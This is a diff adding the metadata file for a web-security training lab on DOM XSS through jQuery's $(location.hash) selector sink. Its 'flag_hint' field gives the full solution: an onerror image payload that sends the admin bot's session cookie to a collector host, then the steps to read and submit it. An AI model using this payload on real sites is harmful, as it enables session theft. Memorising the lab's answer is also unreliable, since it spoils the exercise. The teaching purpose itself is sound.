@@ -1,0 +1,44 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "jquery-location-hash-selector",
+  "title": "DOM XSS via jQuery $(location.hash) Selector-to-Constructor",
+  "track": "xss",
+  "difficulty": "practitioner",
+  "estimated_minutes": 35,
+  "max_lifetime_minutes": 50,
+  "learning_objectives": [
+    "Recognise that jQuery's $() is overloaded: an HTML-looking string is CONSTRUCTED into elements, not selected — making $() a DOM-XSS sink for untrusted input",
+    "Trace a DOM sink from source (location.hash) to sink ($()) where a 'scroll to section' helper passes the fragment straight to jQuery",
+    "Use <img src=x onerror=...> so the payload fires on element construction (a detached node still loads its src) without the bot clicking anything",
+    "Understand why jQuery < 3.5 (here 3.4.1) widens the selector-vs-HTML boundary and why upgrading is only half the fix",
+    "Exfiltrate a non-HttpOnly session cookie to an OOB collector across an egress-dropped network and recognise the real fix: never pass untrusted strings to $()"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["dom-xss-innerhtml-jquery-html"],
+  "flag_hint": "Submit /#<img src=x onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\"> (URL-encoded) to POST /report; the page's $(location.hash.slice(1)) constructs the <img> and onerror fires in the admin bot's browser, exfiltrating its session cookie. Read it via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "jQuery 3.4.1 (vendored; $(hash) selector-to-HTML quirk)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "dom-xss",
+    "jquery",
+    "selector-injection",
+    "location-hash",
+    "cookie-theft",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The jQuery $(location.hash) selector-to-HTML DOM-XSS pattern (PortSwigger DOM XSS in jQuery selector sink), abstracted for local Docker with a Playwright victim bot and an OOB collector. Ships the catalog-pinned jQuery 3.4.1 (< 3.5) because that version's loose selector-vs-HTML boundary is the taught flaw."
+}
